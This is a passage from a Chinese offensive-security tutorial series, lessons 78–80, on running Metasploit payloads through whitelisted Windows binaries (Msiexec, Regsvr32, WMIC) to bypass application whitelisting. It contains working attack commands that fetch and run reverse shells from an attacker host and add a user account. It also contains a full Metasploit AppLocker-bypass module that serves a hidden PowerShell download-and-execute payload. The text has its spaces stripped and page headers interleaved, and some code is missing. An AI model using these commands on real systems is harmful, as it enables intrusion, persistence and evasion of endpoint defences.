本文档使用书栈(BookStack.CN)构建
注：请多喝点热水或者凉白开，身体特别重要。
Msiexec是WindowsInstaller的一部分。用于安装WindowsInstaller安装包（MSI）,
一般在运行MicrosoftUpdate安装更新或安装部分软件的时候出现，占用内存比较大。并且集成
于Windows2003，Windows7等。
说明：Msiexec.exe所在路径已被系统添加PATH环境变量中，因此，Msiexec命令可识别。
Windows2003默认位置：
1. C:\WINDOWS\system32\msiexec.exe
2. C:\WINDOWS\SysWOW64\msiexec.exe
攻击机：192.168.1.4Debian
靶机：192.168.1.119Windows2003
Msiexec简介：
基于白名单Msiexec.exe配置payload：
配置攻击机msf：
配置payload：
第七十八课：基于白名单Msiexec执行payload第八季
-509-
本文档使用书栈(BookStack.CN)构建
1. msfvenom‐pwindows/x64/shell/reverse_tcpLHOST=192.168.1.4LPORT=53‐fmsi>
Micropoor_rev_x64_53.txt
1. C:\Windows\System32\msiexec.exe/q/i
http://192.168.1.4/Micropoor_rev\_x64_53.txt
靶机执行：
第七十八课：基于白名单Msiexec执行payload第八季
-510-
本文档使用书栈(BookStack.CN)构建
Micropoor
第七十八课：基于白名单Msiexec执行payload第八季
-511-
本文档使用书栈(BookStack.CN)构建
注：请多喝点热水或者凉白开，身体特别重要。
Regsvr32命令用于注册COM组件，是Windows系统提供的用来向系统注册控件或者卸载控件的命
令，以命令行方式运行。WinXP及以上系统的regsvr32.exe在windows\system32文件夹下；2000
系统的regsvr32.exe在winnt\system32文件夹下。但搭配regsvr32.exe使用的DLL，需要提供
DllRegisterServer和DllUnregisterServer两个输出函式，或者提供DllInstall输出函
数。
说明：Regsvr32.exe所在路径已被系统添加PATH环境变量中，因此，Regsvr32命令可识别。
Windows2003默认位置：
1. C:\WINDOWS\SysWOW64\regsvr32.exe
2. C:\WINDOWS\system32\regsvr32.exe
攻击机：192.168.1.4Debian
靶机：192.168.1.119Windows2003
msf已内置auxiliary版本的regsvr32_command_delivery_server，但是最新版已经无
exploit版本regsvr32，文章结尾补充。
1. msfauxiliary(server/regsvr32_command_delivery_server)>use
auxiliary/server/regsvr32_command_delivery_server
2. msfauxiliary(server/regsvr32_command_delivery_server)>setCMDnetuser
MicropoorMicropoor/add
3. CMD=>netuserMicropoorMicropoor/add
4. msfauxiliary(server/regsvr32_command_delivery_server)>exploit
5.
6. [*]UsingURL:http://0.0.0.0:8080/ybn7xESQYCGv
7. [*]LocalIP:http://192.168.1.4:8080/ybn7xESQYCGv
8. [*]Serverstarted.
9. [*]Runthefollowingcommandonthetargetmachine:
10.
11. regsvr32/s/n/u/i:http://192.168.1.4:8080/ybn7xESQYCGvscrobj.dll
Regsvr32简介：
配置攻击机msf：
第七十九课：基于白名单Regsvr32执行payload第九季
-512-
本文档使用书栈(BookStack.CN)构建
1. regsvr32/s/n/u/i:http://192.168.1.4:8080/ybn7xESQYCGvscrobj.dll
靶机执行：
第七十九课：基于白名单Regsvr32执行payload第九季
-513-
本文档使用书栈(BookStack.CN)构建
regsvr32_applocker_bypass_server.rb
1. ##
2.
3. #ThismodulerequiresMetasploit:http://metasploit.com/download
4. #Currentsource:https://github.com/rapid7/metasploit‐framework
5.
6. ##
7.
8. classMetasploitModule'Regsvr32.exe(.sct)ApplicationWhitelistingBypassServer',
附：powershell版Regsvr32
第七十九课：基于白名单Regsvr32执行payload第九季
-514-
本文档使用书栈(BookStack.CN)构建
'Description'=>%q(
17. ThismodulesimplifiestheRegsvr32.exeApplicationWhitelistingBypass
technique.
18. Themodulecreatesawebserverthathostsan.sctfile.Whentheusertypes
theprovidedregsvr32commandonasystem,regsvr32willrequestthe.sctfile
andthenexecutetheincludedPowerShellcommand.
19. Thiscommandthendownloadsandexecutesthespecifiedpayload(similartothe
web_deliverymodulewithPSH).
20. Bothwebrequests(i.e.,the.sctfileandPowerShelldownloadandexecute)can
occuronthesameport.
21. ),
22.
23. 'License'=>MSF_LICENSE,
24. 'Author'=>
25. [
26. 'CaseySmith',#AppLockerbypassresearchandvulnerabilitydiscover
y(\@subTee)
27. 'TrentonIvey',#MSFModule(kn0)
28. ],
29. 'DefaultOptions'=>
30. {
31. 'Payload'=>'windows/meterpreter/reverse_tcp'
32. },
33. 'Targets'=>[['PSH',{}]],
34. 'Platform'=>%w(win),
35. 'Arch'=>[ARCH_X86,ARCH_X86_64],
36. 'DefaultTarget'=>0,
37. 'DisclosureDate'=>'Apr192016',
38. 'References'=>
39. [
40. ['URL','http://subt0x10.blogspot.com/2016/04/bypass‐application‐whitelisting‐
script.html']
41. ]
42. ))
43. end
44.
45. defprimer
46. print_status('Runthefollowingcommandonthetargetmachine:')
47. print_line("regsvr32/s/n/u/i:\#{get_uri}.sctscrobj.dll")
48. end
49.
50. defon_request_uri(cli,_request)
第七十九课：基于白名单Regsvr32执行payload第九季
-515-
本文档使用书栈(BookStack.CN)构建
51. #Iftheresourcerequestendswith'.sct',servethe.sctfile
52. #Otherwise,servethePowerShellpayload
53. if_request.raw_uri=~/\.sct$/
54. serve_sct_file
55. else
56. serve_psh_payload
57. end
58. end
59.
60. defserve_sct_file
61. print_status("Handlingrequestforthe.sctfilefrom#{cli.peerhost}")
62. ignore_cert=Rex::Powershell::PshMethods.ignore_ssl_certificateifssl
63. download_string=
Rex::Powershell::PshMethods.proxy_aware_download_and_exec_string(get_uri)
64. download_and_run="#{ignore_cert}#{download_string}"
65. psh_command=generate_psh_command_line(
66. noprofile:true,
67. windowstyle:'hidden',
68. command:download_and_run
69. )
70. data=gen_sct_file(psh_command)
71. send_response(cli,data,'Content‐Type'=>'text/plain')
72. end
73.
74. defserve_psh_payload
75. print_status("Deliveringpayloadto#{cli.peerhost}")
76. data=cmd_psh_payload(payload.encoded,
77. payload_instance.arch.first,
78. remove_comspec:true,
79. use_single_quotes:true
80. )
81. send_response(cli,data,'Content‐Type'=>'application/octet‐stream')
82. end
83.
84. defrand_class_id
85. "#{Rex::Text.rand_text_hex8}‐#{Rex::Text.rand_text_hex4}‐#
{Rex::Text.rand_text_hex4}‐#{Rex::Text.rand_text_hex4}‐#
{Rex::Text.rand_text_hex12}"
86. end
87.
88. defgen_sct_file(command)
89. %{
}
91. end
92.
93. end
使用方法：
copyregsvr32_applocker_bypass_server.rbto/usr/share/metasploit-
framework/modules/exploits/windows/misc
Micropoor
第七十九课：基于白名单Regsvr32执行payload第九季
-517-
本文档使用书栈(BookStack.CN)构建
注：请多喝点热水或者凉白开，可预防肾结石，通风等。
WMIC扩展WMI（WindowsManagementInstrumentation，Windows管理工具），提供了从命令
行接口和批命令脚本执行系统管理的支持。在WMIC出现之前，如果要管理WMI系统，必须使用一些专门
的WMI应用，例如SMS，或者使用WMI的脚本编程API，或者使用象CIMStudio之类的工具。如果不熟
悉C++之类的编程语言或VBScript之类的脚本语言，或者不掌握WMI名称空间的基本知识，要用WMI管
理系统是很困难的。WMIC改变了这种情况。
说明：Wmic.exe所在路径已被系统添加PATH环境变量中，因此，Wmic命令可识别，需注意x86，x64
位的Wmic调用。
Windows2003默认位置：
1. C:\WINDOWS\system32\wbem\wmic.exe
2. C:\WINDOWS\SysWOW64\wbem\wmic.exe
Windows7默认位置：
1. C:\Windows\System32\wbem\WMIC.exe
2. C:\Windows\SysWOW64\wbem\WMIC.exe
攻击机：
192.168.1.4Debian
靶机：
192.168.1.119Windows2003
192.168.1.5Windows7
1. msfexploit(multi/handler)>showoptions
2.
3. Moduleoptions(exploit/multi/handler):
4.
5. NameCurrentSettingRequiredDescription
6. ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
7.
8. Payloadoptions(windows/meterpreter/reverse_tcp):
9.
10. NameCurrentSettingRequiredDescription
Wmic简介：
配置攻击机msf：
第八十课：基于白名单Wmic执行payload第十季
-518-
本文档使用书栈(BookStack.CN)构建
11. ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
12. EXITFUNCprocessyesExittechnique(Accepted:'',seh,thread,process,none)
13.
14. LHOST192.168.1.4yesThelistenaddress(aninterfacemaybespecified)
15.
16. LPORT53yesThelistenport
17.
18. Exploittarget:
19.
20. IdName
21.
22. ‐‐‐‐‐‐
23.
24. 0WildcardTarget23
Windows7：
1. C:\Windows\SysWOW64\wbem\WMIC.exeosget
2. /format:"http://192.168.1.4/Micropoor.xsl"
靶机执行：